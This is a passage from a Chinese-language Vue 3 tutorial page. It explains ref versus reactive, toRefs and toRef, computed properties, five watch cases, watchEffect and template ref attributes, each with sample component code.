&lt;h2&gt;汽车信息：一台&#123;&#123; car.brand &#125;&#125;汽车，价值&#123;&#123; car.price &#125;&#125;万&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;游戏列表：&lt;/h2&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">      &lt;li v-for=&quot;g in games&quot; :key=&quot;g.id&quot;&gt;&#123;&#123; g.name &#125;&#125;&lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">    &lt;h2&gt;测试：&#123;&#123;obj.a.b.c.d&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button @click=&quot;changeCarPrice&quot;&gt;修改汽车价格&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changeFirstGame&quot;&gt;修改第一游戏&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;test&quot;&gt;测试&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;Person&quot;&gt;</span><br><span class="line">import &#123; ref &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">// 数据</span><br><span class="line">let car = ref(&#123; brand: &#x27;奔驰&#x27;, price: 100 &#125;)</span><br><span class="line">let games = ref([</span><br><span class="line">  &#123; id: &#x27;ahsgdyfa01&#x27;, name: &#x27;英雄联盟&#x27; &#125;,</span><br><span class="line">  &#123; id: &#x27;ahsgdyfa02&#x27;, name: &#x27;王者荣耀&#x27; &#125;,</span><br><span class="line">  &#123; id: &#x27;ahsgdyfa03&#x27;, name: &#x27;原神&#x27; &#125;</span><br><span class="line">])</span><br><span class="line">let obj = ref(&#123;</span><br><span class="line">  a:&#123;</span><br><span class="line">    b:&#123;</span><br><span class="line">      c:&#123;</span><br><span class="line">        d:666</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">console.log(car)</span><br><span class="line"></span><br><span class="line">function changeCarPrice() &#123;</span><br><span class="line">  car.value.price += 10</span><br><span class="line">&#125;</span><br><span class="line">function changeFirstGame() &#123;</span><br><span class="line">  games.value[0].name = &#x27;流星蝴蝶剑&#x27;</span><br><span class="line">&#125;</span><br><span class="line">function test()&#123;</span><br><span class="line">  obj.value.a.b.c.d = 999</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="3-6-【ref-对比-reactive】"><a href="#3-6-【ref-对比-reactive】" class="headerlink" title="3.6. 【ref 对比 reactive】"></a>3.6. 【ref 对比 reactive】</h2><p>宏观角度看：</p></li></ul><blockquote><ol><li><p><code>ref</code>用来定义：<strong>基本类型数据</strong>、<strong>对象类型数据</strong>；</p></li><li><p><code>reactive</code>用来定义：<strong>对象类型数据</strong>。</p></li></ol></blockquote><ul><li>区别：</li></ul><blockquote><ol><li><p><code>ref</code>创建的变量必须使用<code>.value</code>（可以使用<code>volar</code>插件自动添加<code>.value</code>）。</p><img src="images/自动补充value.png" alt="自动补充value" style="zoom:50%;border-radius:20px" /> </li><li><p><code>reactive</code>重新分配一个新对象，会<strong>失去</strong>响应式（可以使用<code>Object.assign</code>去整体替换）。</p></li></ol></blockquote><ul><li>使用原则：<blockquote><ol><li>若需要一个基本类型的响应式数据，必须使用<code>ref</code>。</li><li>若需要一个响应式对象，层级不深，<code>ref</code>、<code>reactive</code>都可以。</li><li>若需要一个响应式对象，且层级较深，推荐使用<code>reactive</code>。</li></ol></blockquote></li></ul><h2 id="3-7-【toRefs-与-toRef】"><a href="#3-7-【toRefs-与-toRef】" class="headerlink" title="3.7. 【toRefs 与 toRef】"></a>3.7. 【toRefs 与 toRef】</h2><ul><li>作用：将一个响应式对象中的每一个属性，转换为<code>ref</code>对象。</li><li>备注：<code>toRefs</code>与<code>toRef</code>功能一致，但<code>toRefs</code>可以批量转换。</li><li>语法如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">    &lt;h2&gt;姓名：&#123;&#123;person.name&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;年龄：&#123;&#123;person.age&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;性别：&#123;&#123;person.gender&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button @click=&quot;changeName&quot;&gt;修改名字&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changeAge&quot;&gt;修改年龄&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changeGender&quot;&gt;修改性别&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;Person&quot;&gt;</span><br><span class="line">  import &#123;ref,reactive,toRefs,toRef&#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">  // 数据</span><br><span class="line">  let person = reactive(&#123;name:&#x27;张三&#x27;, age:18, gender:&#x27;男&#x27;&#125;)</span><br><span class="line"></span><br><span class="line">  // 通过toRefs将person对象中的n个属性批量取出，且依然保持响应式的能力</span><br><span class="line">  let &#123;name,gender&#125; =  toRefs(person)</span><br><span class="line"></span><br><span class="line">  // 通过toRef将person对象中的gender属性取出，且依然保持响应式的能力</span><br><span class="line">  let age = toRef(person,&#x27;age&#x27;)</span><br><span class="line"></span><br><span class="line">  // 方法</span><br><span class="line">  function changeName()&#123;</span><br><span class="line">    name.value += &#x27;~&#x27;</span><br><span class="line">  &#125;</span><br><span class="line">  function changeAge()&#123;</span><br><span class="line">    age.value += 1</span><br><span class="line">  &#125;</span><br><span class="line">  function changeGender()&#123;</span><br><span class="line">    gender.value = &#x27;女&#x27;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="3-8-【computed】"><a href="#3-8-【computed】" class="headerlink" title="3.8. 【computed】"></a>3.8. 【computed】</h2></li></ul><p>作用：根据已有数据计算出新数据（和<code>Vue2</code>中的<code>computed</code>作用一致）。</p><img src="images/computed.gif" style="zoom:20%;" />  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">    姓：&lt;input type=&quot;text&quot; v-model=&quot;firstName&quot;&gt; &lt;br&gt;</span><br><span class="line">    名：&lt;input type=&quot;text&quot; v-model=&quot;lastName&quot;&gt; &lt;br&gt;</span><br><span class="line">    全名：&lt;span&gt;&#123;&#123;fullName&#125;&#125;&lt;/span&gt; &lt;br&gt;</span><br><span class="line">    &lt;button @click=&quot;changeFullName&quot;&gt;全名改为：li-si&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;App&quot;&gt;</span><br><span class="line">  import &#123;ref,computed&#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">  let firstName = ref(&#x27;zhang&#x27;)</span><br><span class="line">  let lastName = ref(&#x27;san&#x27;)</span><br><span class="line"></span><br><span class="line">  // 计算属性——只读取，不修改</span><br><span class="line">  /* let fullName = computed(()=&gt;&#123;</span><br><span class="line">    return firstName.value + &#x27;-&#x27; + lastName.value</span><br><span class="line">  &#125;) */</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // 计算属性——既读取又修改</span><br><span class="line">  let fullName = computed(&#123;</span><br><span class="line">    // 读取</span><br><span class="line">    get()&#123;</span><br><span class="line">      return firstName.value + &#x27;-&#x27; + lastName.value</span><br><span class="line">    &#125;,</span><br><span class="line">    // 修改</span><br><span class="line">    set(val)&#123;</span><br><span class="line">      console.log(&#x27;有人修改了fullName&#x27;,val)</span><br><span class="line">      firstName.value = val.split(&#x27;-&#x27;)[0]</span><br><span class="line">      lastName.value = val.split(&#x27;-&#x27;)[1]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  function changeFullName()&#123;</span><br><span class="line">    fullName.value = &#x27;li-si&#x27;</span><br><span class="line">  &#125; </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="3-9-【watch】"><a href="#3-9-【watch】" class="headerlink" title="3.9.【watch】"></a>3.9.【watch】</h2><ul><li>作用：监视数据的变化（和<code>Vue2</code>中的<code>watch</code>作用一致）</li><li>特点：<code>Vue3</code>中的<code>watch</code>只能监视以下<strong>四种数据</strong>：<blockquote><ol><li><code>ref</code>定义的数据。</li><li><code>reactive</code>定义的数据。</li><li>函数返回一个值（<code>getter</code>函数）。</li><li>一个包含上述内容的数组。</li></ol></blockquote></li></ul><p>我们在<code>Vue3</code>中使用<code>watch</code>的时候，通常会遇到以下几种情况：</p><h3 id="情况一"><a href="#情况一" class="headerlink" title="* 情况一"></a>* 情况一</h3><p>监视<code>ref</code>定义的【基本类型】数据：直接写数据名即可，监视的是其<code>value</code>值的改变。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">    &lt;h1&gt;情况一：监视【ref】定义的【基本类型】数据&lt;/h1&gt;</span><br><span class="line">    &lt;h2&gt;当前求和为：&#123;&#123;sum&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button @click=&quot;changeSum&quot;&gt;点我sum+1&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;Person&quot;&gt;</span><br><span class="line">  import &#123;ref,watch&#125; from &#x27;vue&#x27;</span><br><span class="line">  // 数据</span><br><span class="line">  let sum = ref(0)</span><br><span class="line">  // 方法</span><br><span class="line">  function changeSum()&#123;</span><br><span class="line">    sum.value += 1</span><br><span class="line">  &#125;</span><br><span class="line">  // 监视，情况一：监视【ref】定义的【基本类型】数据</span><br><span class="line">  const stopWatch = watch(sum,(newValue,oldValue)=&gt;&#123;</span><br><span class="line">    console.log(&#x27;sum变化了&#x27;,newValue,oldValue)</span><br><span class="line">    if(newValue &gt;= 10)&#123;</span><br><span class="line">      stopWatch()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="情况二"><a href="#情况二" class="headerlink" title="* 情况二"></a>* 情况二</h3><p>监视<code>ref</code>定义的【对象类型】数据：直接写数据名，监视的是对象的【地址值】，若想监视对象内部的数据，要手动开启深度监视。</p><blockquote><p>注意：</p><ul><li><p>若修改的是<code>ref</code>定义的对象中的属性，<code>newValue</code> 和 <code>oldValue</code> 都是新值，因为它们是同一个对象。</p></li><li><p>若修改整个<code>ref</code>定义的对象，<code>newValue</code> 是新值， <code>oldValue</code> 是旧值，因为不是同一个对象了。</p></li></ul></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">    &lt;h1&gt;情况二：监视【ref】定义的【对象类型】数据&lt;/h1&gt;</span><br><span class="line">    &lt;h2&gt;姓名：&#123;&#123; person.name &#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;年龄：&#123;&#123; person.age &#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button @click=&quot;changeName&quot;&gt;修改名字&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changeAge&quot;&gt;修改年龄&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changePerson&quot;&gt;修改整个人&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;Person&quot;&gt;</span><br><span class="line">  import &#123;ref,watch&#125; from &#x27;vue&#x27;</span><br><span class="line">  // 数据</span><br><span class="line">  let person = ref(&#123;</span><br><span class="line">    name:&#x27;张三&#x27;,</span><br><span class="line">    age:18</span><br><span class="line">  &#125;)</span><br><span class="line">  // 方法</span><br><span class="line">  function changeName()&#123;</span><br><span class="line">    person.value.name += &#x27;~&#x27;</span><br><span class="line">  &#125;</span><br><span class="line">  function changeAge()&#123;</span><br><span class="line">    person.value.age += 1</span><br><span class="line">  &#125;</span><br><span class="line">  function changePerson()&#123;</span><br><span class="line">    person.value = &#123;name:&#x27;李四&#x27;,age:90&#125;</span><br><span class="line">  &#125;</span><br><span class="line">  /* </span><br><span class="line">    监视，情况一：监视【ref】定义的【对象类型】数据，监视的是对象的地址值，若想监视对象内部属性的变化，需要手动开启深度监视</span><br><span class="line">    watch的第一个参数是：被监视的数据</span><br><span class="line">    watch的第二个参数是：监视的回调</span><br><span class="line">    watch的第三个参数是：配置对象（deep、immediate等等.....） </span><br><span class="line">  */</span><br><span class="line">  watch(person,(newValue,oldValue)=&gt;&#123;</span><br><span class="line">    console.log(&#x27;person变化了&#x27;,newValue,oldValue)</span><br><span class="line">  &#125;,&#123;deep:true&#125;)</span><br><span class="line">  </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="情况三"><a href="#情况三" class="headerlink" title="*  情况三"></a>*  情况三</h3><p>监视<code>reactive</code>定义的【对象类型】数据，且默认开启了深度监视。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">    &lt;h1&gt;情况三：监视【reactive】定义的【对象类型】数据&lt;/h1&gt;</span><br><span class="line">    &lt;h2&gt;姓名：&#123;&#123; person.name &#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;年龄：&#123;&#123; person.age &#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button @click=&quot;changeName&quot;&gt;修改名字&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changeAge&quot;&gt;修改年龄&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changePerson&quot;&gt;修改整个人&lt;/button&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;h2&gt;测试：&#123;&#123;obj.a.b.c&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button @click=&quot;test&quot;&gt;修改obj.a.b.c&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;Person&quot;&gt;</span><br><span class="line">  import &#123;reactive,watch&#125; from &#x27;vue&#x27;</span><br><span class="line">  // 数据</span><br><span class="line">  let person = reactive(&#123;</span><br><span class="line">    name:&#x27;张三&#x27;,</span><br><span class="line">    age:18</span><br><span class="line">  &#125;)</span><br><span class="line">  let obj = reactive(&#123;</span><br><span class="line">    a:&#123;</span><br><span class="line">      b:&#123;</span><br><span class="line">        c:666</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  // 方法</span><br><span class="line">  function changeName()&#123;</span><br><span class="line">    person.name += &#x27;~&#x27;</span><br><span class="line">  &#125;</span><br><span class="line">  function changeAge()&#123;</span><br><span class="line">    person.age += 1</span><br><span class="line">  &#125;</span><br><span class="line">  function changePerson()&#123;</span><br><span class="line">    Object.assign(person,&#123;name:&#x27;李四&#x27;,age:80&#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  function test()&#123;</span><br><span class="line">    obj.a.b.c = 888</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // 监视，情况三：监视【reactive】定义的【对象类型】数据，且默认是开启深度监视的</span><br><span class="line">  watch(person,(newValue,oldValue)=&gt;&#123;</span><br><span class="line">    console.log(&#x27;person变化了&#x27;,newValue,oldValue)</span><br><span class="line">  &#125;)</span><br><span class="line">  watch(obj,(newValue,oldValue)=&gt;&#123;</span><br><span class="line">    console.log(&#x27;Obj变化了&#x27;,newValue,oldValue)</span><br><span class="line">  &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="情况四"><a href="#情况四" class="headerlink" title="* 情况四"></a>* 情况四</h3><p>监视<code>ref</code>或<code>reactive</code>定义的【对象类型】数据中的<strong>某个属性</strong>，注意点如下：</p><ol><li>若该属性值<strong>不是</strong>【对象类型】，需要写成函数形式。</li><li>若该属性值是<strong>依然</strong>是【对象类型】，可直接编，也可写成函数，建议写成函数。</li></ol><p>结论：监视的要是对象里的属性，那么最好写函数式，注意点：若是对象监视的是地址值，需要关注对象内部，需要手动开启深度监视。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">    &lt;h1&gt;情况四：监视【ref】或【reactive】定义的【对象类型】数据中的某个属性&lt;/h1&gt;</span><br><span class="line">    &lt;h2&gt;姓名：&#123;&#123; person.name &#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;年龄：&#123;&#123; person.age &#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;汽车：&#123;&#123; person.car.c1 &#125;&#125;、&#123;&#123; person.car.c2 &#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button @click=&quot;changeName&quot;&gt;修改名字&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changeAge&quot;&gt;修改年龄&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changeC1&quot;&gt;修改第一台车&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changeC2&quot;&gt;修改第二台车&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changeCar&quot;&gt;修改整个车&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;Person&quot;&gt;</span><br><span class="line">  import &#123;reactive,watch&#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">  // 数据</span><br><span class="line">  let person = reactive(&#123;</span><br><span class="line">    name:&#x27;张三&#x27;,</span><br><span class="line">    age:18,</span><br><span class="line">    car:&#123;</span><br><span class="line">      c1:&#x27;奔驰&#x27;,</span><br><span class="line">      c2:&#x27;宝马&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  // 方法</span><br><span class="line">  function changeName()&#123;</span><br><span class="line">    person.name += &#x27;~&#x27;</span><br><span class="line">  &#125;</span><br><span class="line">  function changeAge()&#123;</span><br><span class="line">    person.age += 1</span><br><span class="line">  &#125;</span><br><span class="line">  function changeC1()&#123;</span><br><span class="line">    person.car.c1 = &#x27;奥迪&#x27;</span><br><span class="line">  &#125;</span><br><span class="line">  function changeC2()&#123;</span><br><span class="line">    person.car.c2 = &#x27;大众&#x27;</span><br><span class="line">  &#125;</span><br><span class="line">  function changeCar()&#123;</span><br><span class="line">    person.car = &#123;c1:&#x27;雅迪&#x27;,c2:&#x27;爱玛&#x27;&#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // 监视，情况四：监视响应式对象中的某个属性，且该属性是基本类型的，要写成函数式</span><br><span class="line">  /* watch(()=&gt; person.name,(newValue,oldValue)=&gt;&#123;</span><br><span class="line">    console.log(&#x27;person.name变化了&#x27;,newValue,oldValue)</span><br><span class="line">  &#125;) */</span><br><span class="line"></span><br><span class="line">  // 监视，情况四：监视响应式对象中的某个属性，且该属性是对象类型的，可以直接写，也能写函数，更推荐写函数</span><br><span class="line">  watch(()=&gt;person.car,(newValue,oldValue)=&gt;&#123;</span><br><span class="line">    console.log(&#x27;person.car变化了&#x27;,newValue,oldValue)</span><br><span class="line">  &#125;,&#123;deep:true&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="情况五"><a href="#情况五" class="headerlink" title="* 情况五"></a>* 情况五</h3><p>监视上述的多个数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">    &lt;h1&gt;情况五：监视上述的多个数据&lt;/h1&gt;</span><br><span class="line">    &lt;h2&gt;姓名：&#123;&#123; person.name &#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;年龄：&#123;&#123; person.age &#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;汽车：&#123;&#123; person.car.c1 &#125;&#125;、&#123;&#123; person.car.c2 &#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button @click=&quot;changeName&quot;&gt;修改名字&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changeAge&quot;&gt;修改年龄&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changeC1&quot;&gt;修改第一台车&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changeC2&quot;&gt;修改第二台车&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changeCar&quot;&gt;修改整个车&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;Person&quot;&gt;</span><br><span class="line">  import &#123;reactive,watch&#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">  // 数据</span><br><span class="line">  let person = reactive(&#123;</span><br><span class="line">    name:&#x27;张三&#x27;,</span><br><span class="line">    age:18,</span><br><span class="line">    car:&#123;</span><br><span class="line">      c1:&#x27;奔驰&#x27;,</span><br><span class="line">      c2:&#x27;宝马&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  // 方法</span><br><span class="line">  function changeName()&#123;</span><br><span class="line">    person.name += &#x27;~&#x27;</span><br><span class="line">  &#125;</span><br><span class="line">  function changeAge()&#123;</span><br><span class="line">    person.age += 1</span><br><span class="line">  &#125;</span><br><span class="line">  function changeC1()&#123;</span><br><span class="line">    person.car.c1 = &#x27;奥迪&#x27;</span><br><span class="line">  &#125;</span><br><span class="line">  function changeC2()&#123;</span><br><span class="line">    person.car.c2 = &#x27;大众&#x27;</span><br><span class="line">  &#125;</span><br><span class="line">  function changeCar()&#123;</span><br><span class="line">    person.car = &#123;c1:&#x27;雅迪&#x27;,c2:&#x27;爱玛&#x27;&#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // 监视，情况五：监视上述的多个数据</span><br><span class="line">  watch([()=&gt;person.name,person.car],(newValue,oldValue)=&gt;&#123;</span><br><span class="line">    console.log(&#x27;person.car变化了&#x27;,newValue,oldValue)</span><br><span class="line">  &#125;,&#123;deep:true&#125;)</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="3-10-【watchEffect】"><a href="#3-10-【watchEffect】" class="headerlink" title="3.10. 【watchEffect】"></a>3.10. 【watchEffect】</h2><ul><li><p>官网：立即运行一个函数，同时响应式地追踪其依赖，并在依赖更改时重新执行该函数。</p></li><li><p><code>watch</code>对比<code>watchEffect</code></p><blockquote><ol><li><p>都能监听响应式数据的变化，不同的是监听数据变化的方式不同</p></li><li><p><code>watch</code>：要明确指出监视的数据</p></li><li><p><code>watchEffect</code>：不用明确指出监视的数据（函数中用到哪些属性，那就监视哪些属性）。</p></li></ol></blockquote></li><li><p>示例代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">    &lt;h1&gt;需求：水温达到50℃，或水位达到20cm，则联系服务器&lt;/h1&gt;</span><br><span class="line">    &lt;h2 id=&quot;demo&quot;&gt;水温：&#123;&#123;temp&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;水位：&#123;&#123;height&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button @click=&quot;changePrice&quot;&gt;水温+1&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changeSum&quot;&gt;水位+10&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;Person&quot;&gt;</span><br><span class="line">  import &#123;ref,watch,watchEffect&#125; from &#x27;vue&#x27;</span><br><span class="line">  // 数据</span><br><span class="line">  let temp = ref(0)</span><br><span class="line">  let height = ref(0)</span><br><span class="line"></span><br><span class="line">  // 方法</span><br><span class="line">  function changePrice()&#123;</span><br><span class="line">    temp.value += 10</span><br><span class="line">  &#125;</span><br><span class="line">  function changeSum()&#123;</span><br><span class="line">    height.value += 1</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // 用watch实现，需要明确的指出要监视：temp、height</span><br><span class="line">  watch([temp,height],(value)=&gt;&#123;</span><br><span class="line">    // 从value中获取最新的temp值、height值</span><br><span class="line">    const [newTemp,newHeight] = value</span><br><span class="line">    // 室温达到50℃，或水位达到20cm，立刻联系服务器</span><br><span class="line">    if(newTemp &gt;= 50 || newHeight &gt;= 20)&#123;</span><br><span class="line">      console.log(&#x27;联系服务器&#x27;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  // 用watchEffect实现，不用</span><br><span class="line">  const stopWtach = watchEffect(()=&gt;&#123;</span><br><span class="line">    // 室温达到50℃，或水位达到20cm，立刻联系服务器</span><br><span class="line">    if(temp.value &gt;= 50 || height.value &gt;= 20)&#123;</span><br><span class="line">      console.log(document.getElementById(&#x27;demo&#x27;)?.innerText)</span><br><span class="line">      console.log(&#x27;联系服务器&#x27;)</span><br><span class="line">    &#125;</span><br><span class="line">    // 水温达到100，或水位达到50，取消监视</span><br><span class="line">    if(temp.value === 100 || height.value === 50)&#123;</span><br><span class="line">      console.log(&#x27;清理了&#x27;)</span><br><span class="line">      stopWtach()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ul><h2 id="3-11-【标签的-ref-属性】"><a href="#3-11-【标签的-ref-属性】" class="headerlink" title="3.11. 【标签的 ref 属性】"></a>3.11. 【标签的 ref 属性】</h2><p>作用：用于注册模板引用。</p><blockquote><ul><li><p>用在普通<code>DOM</code>标签上，获取的是<code>DOM</code>节点。</p></li><li><p>用在组件标签上，获取的是组件实例对象。</p></li></ul></blockquote><p>用在普通<code>DOM</code>标签上：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">    &lt;h1 ref=&quot;title1&quot;&gt;尚硅谷&lt;/h1&gt;</span><br><span class="line">    &lt;h2 ref=&quot;title2&quot;&gt;前端&lt;/h2&gt;</span><br><span class="line">    &lt;h3 ref=&quot;title3&quot;&gt;Vue&lt;/h3&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; ref=&quot;inpt&quot;&gt; &lt;br&gt;&lt;br&gt;</span><br><span class="line">    &lt;button @click=&quot;showLog&quot;&gt;点我打印内容&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;Person&quot;&gt;</span><br><span class="line">  import &#123;ref&#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">  let title1 = ref()</span><br><span class="line">  let title2 = ref()</span><br><span class="line">  let title3 = ref()</span><br><span class="line"></span><br><span class="line">  function showLog()&#123;</span><br><span class="line">    // 通过id获取元素</span><br><span class="line">    const t1 = document.getElementById(&#x27;title1&#x27;)</span><br><span class="line">    // 打印内容</span><br><span class="line">    console.log((t1 as HTMLElement).innerText)</span><br><span class="line">    console.log((&lt;HTMLElement&gt;t1).innerText)</span><br><span class="line">    console.log(t1?.innerText)</span><br><span class="line">    </span><br><span class="line">/************************************/</span><br><span class="line"></span><br><span class="line">    // 通过ref获取元素</span><br><span class="line">    console.log(title1.value)</span><br><span class="line">    console.log(title2.value)</span><br><span class="line">    console.log(title3.value)</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>用在组件标签上：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 父组件App.vue --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;Person ref=&quot;ren&quot;/&gt;</span><br><span class="line">  &lt;button @click=&quot;test&quot;&gt;测试&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;App&quot;&gt;</span><br><span class="line">  import Person from &#x27;./components/Person.vue&#x27;</span><br><span class="line">  import &#123;ref&#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">  let ren = ref()</span><br><span class="line"></span><br><span class="line">  function test()&#123;</span><br><span class="line">    console.log(ren.value.name)</span><br><span class="line">    console.log(ren.value.age)</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- 子组件Person.vue中要使用defineExpose暴露内容 --&gt;</span><br><span class="line">&lt;script 